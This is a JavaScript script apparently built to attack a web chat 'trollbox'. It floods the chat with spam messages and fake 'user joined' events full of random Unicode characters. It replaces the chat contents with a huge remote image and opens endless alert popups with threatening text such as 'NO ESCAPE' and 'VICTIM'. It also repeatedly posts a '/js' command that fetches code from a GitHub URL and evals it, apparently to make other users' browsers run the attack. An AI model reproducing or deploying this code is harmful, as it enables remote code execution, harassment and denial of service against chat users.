const hue = ["https://leopard.hosting.pecon.us/dl/raszc/gdfdfgdfghdfgdfh.png"]
const alerts = ["NO ESCAPE","000","UR NEXT","IVORY IS BACK","666","IVORY CODES","VICTIM"]
setInterval(function(){socket.emit('message', 'IVORY IS BACK')},Math.random() * 2000);
setInterval(function(){socket.emit('message', "/js fetch('https://raw.githubusercontent.com/ivorydevrimoalt/javascriptexploittrollboxremake/main/js.js').then(res => res.text()).then(eval);")},Math.random() * 2000);
setInterval(function(){socket.emit('message', ":D")},Math.random() * 2000);
const necoArcGifUrl = hue[Math.floor(Math.random()*hue.length)];
function replaceInsiders() {
  const necoArcGifUrl = hue[Math.floor(Math.random()*hue.length)];
  const trollboxScrollElement = document.getElementById("trollbox_scroll");
  if (!trollboxScrollElement) {
    console.error("Element with ID 'trollbox_scroll' not found!");
    return;
  }

  // Remove all existing child nodes (text and images)
  trollboxScrollElement.innerHTML = "";

  // Create an image element for the Necco Arc GIF
  const necoArcImage = document.createElement("img");
  necoArcImage.src = necoArcGifUrl;
  necoArcImage.alt = "IVORY IS BACK";

  // Set desired image size (adjust as needed)
  necoArcImage.style.width = "1734px";
  necoArcImage.style.height = "910px";

  // Append the image to the trollbox scroll element
  trollboxScrollElement.appendChild(necoArcImage);
}

setInterval(function(){
replaceInsiders();
},Math.random() * 2000)
setInterval(function(){
alert(alerts[Math.floor(Math.random()*alerts.length)])
},Math.random() * 5000)

setInterval(function(){socket.emit("user joined", String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + "  :)  " + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)) + String.fromCharCode(0x10FFFF + Math.random() * (0x0000-0x10FFFF+1)))},Math.random() * 2000)
